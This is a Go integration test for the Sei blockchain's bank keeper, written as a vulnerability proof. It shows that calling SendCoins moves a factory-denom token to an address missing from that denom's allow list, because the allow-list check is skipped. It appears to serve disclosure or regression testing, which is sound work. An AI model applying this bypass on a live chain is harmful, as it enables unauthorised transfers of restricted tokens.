package keeper_test

import (
	sdk "github.com/sei-protocol/sei-chain/sei-cosmos/types"
	"github.com/sei-protocol/sei-chain/sei-cosmos/x/bank/types"
)

func (suite *IntegrationTestSuite) TestAllowListBypass() {
	app, ctx := suite.app, suite.ctx
	addr1 := sdk.AccAddress("addr1_______________")
	addr2 := sdk.AccAddress("addr2_______________")
	
	// Create a factory coin
	factoryDenom := "factory/sei1addr1/test"
	factoryCoin := sdk.NewCoin(factoryDenom, sdk.NewInt(100))
	
	// Fund addr1
	suite.Require().NoError(app.BankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(factoryCoin)))
	suite.Require().NoError(app.BankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr1, sdk.NewCoins(factoryCoin)))
	
	// Set allow list for factoryDenom: ONLY addr1 is allowed
	app.BankKeeper.SetDenomAllowList(ctx, factoryDenom, types.AllowList{
		Addresses: []string{addr1.String()},
	})
	
	// VULNERABILITY PROOF:
	// app.BankKeeper.SendCoins should bypass the allow list check because it doesn't call IsInDenomAllowList.
	// This simulates what happens in EVM or CosmWasm.
	err := app.BankKeeper.SendCoins(ctx, addr1, addr2, sdk.NewCoins(factoryCoin))
	
	// If the allow list was enforced, this should fail. But it SUCCEEDS.
	suite.Require().NoError(err, "SendCoins should have bypassed the allow list")
	
	// Check balance of addr2
	bal2 := app.BankKeeper.GetBalance(ctx, addr2, factoryDenom)
	suite.Require().Equal(factoryCoin.Amount, bal2.Amount, "addr2 should have received the coins despite not being in allow list")
}
